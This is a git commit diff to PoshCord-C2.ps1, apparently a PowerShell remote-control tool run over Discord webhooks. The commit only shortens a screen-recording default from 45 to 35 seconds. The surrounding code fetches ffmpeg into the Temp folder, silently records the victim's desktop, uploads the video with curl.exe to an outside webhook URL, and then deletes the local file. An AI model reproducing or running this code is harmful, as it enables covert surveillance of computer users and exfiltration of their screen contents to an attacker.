59c26adbd591b5331cc835c9083204e81d502e29
pickle493 <67724818+pickle493@users.noreply.github.com>
2024-03-18 16:10:21 -0400

    Update PoshCord-C2.ps1

--- PoshCord-C2.ps1
+++ PoshCord-C2.ps1
@@ -917,12 +917,12 @@ param ([int[]]$t)
     If (!(Test-Path $Path)){  
         GetFfmpeg
     }
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t 45 seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t 35 seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
     Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
     
     $mkvPath = "$env:Temp\ScreenClip.mkv"
-    if ($t.Length -eq 0){$t = 45}
-    .$env:Temp\ffmpeg.exe -f gdigrab -t 45 -framerate 24 -i desktop $mkvPath
+    if ($t.Length -eq 0){$t = 35}
+    .$env:Temp\ffmpeg.exe -f gdigrab -t 35 -framerate 24 -i desktop $mkvPath
     curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
     sleep 5
     rm -Path $mkvPath -Force
